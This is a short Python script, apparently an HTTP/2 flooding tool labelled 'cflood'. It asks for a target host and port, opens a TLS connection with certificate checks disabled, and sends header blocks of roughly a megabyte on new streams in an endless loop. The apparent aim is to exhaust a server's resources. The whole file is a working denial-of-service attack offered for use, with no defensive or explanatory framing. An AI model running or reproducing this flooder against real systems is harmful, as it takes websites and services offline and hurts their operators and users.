import socket
import ssl
from h2 import connection, config

def color_red(text):
    RED = "\033[91m"
    RESET = "\033[0m"
    return f"{RED}{text}{RESET}" 

def continuation_flood(target, port):
    sock = socket.create_connection((target, port))
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(['h2'])
    sock = ctx.wrap_socket(sock, server_hostname=target)

    cfg = config.H2Configuration(client_side=True)
    conn = connection.H2Connection(config=cfg)
    conn.initiate_connection()

    headers = [
        (':method', 'GET'),
        (':authority', target),
        (':path', '/'),
        (':scheme', 'https')
    ]
    headers.extend([('flood', 'X' * 1000)] * 1000)

    while True:
        conn.send_headers(conn.get_next_available_stream_id(), headers)
        sock.send(conn.data_to_send())
print(color_red("""
        _____.__                    .___
  _____/ ____\  |   ____   ____   __| _/
_/ ___\   __\|  |  /  _ \ /  _ \ / __ | 
\  \___|  |  |  |_(  <_> |  <_> ) /_/ | 
 \___  >__|  |____/\____/ \____/\____ | 
     \/                              \/ 

"""))
target = input(color_red("Enter target IP address or domain name: "))
port = int(input(color_red("Enter port: ")))

continuation_flood(target, port)
